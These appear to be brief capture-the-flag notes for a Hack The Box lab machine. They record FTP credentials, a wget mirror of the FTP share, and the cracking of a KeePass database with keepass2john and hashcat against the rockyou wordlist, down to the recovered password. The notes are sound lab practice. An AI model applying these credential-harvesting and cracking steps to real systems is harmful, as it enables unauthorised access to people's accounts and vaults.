# FTP movement

Creds: ftp_user:UTDRSCH53c"$6hys

![[Pasted image 20211116042655.png]]

Have a few folder, so a use the wget -- mirror to download all

```bash
$ wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@tally.htb.local
```

### Interisting files
* ./Intranet/Binaries/Firefox Setup 44.0.2.exe
* ./Tim/Files/tim.kdbx

### Cracking tim.kdbx
```bash
$ keepass2john tim.kdbx 
tim:$keepass$*2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
```

```bash
$ hashcat -m 13400 timhash.kdbx /usr/share/wordlists/rockyou.txt --force
```

Password: simplementeyo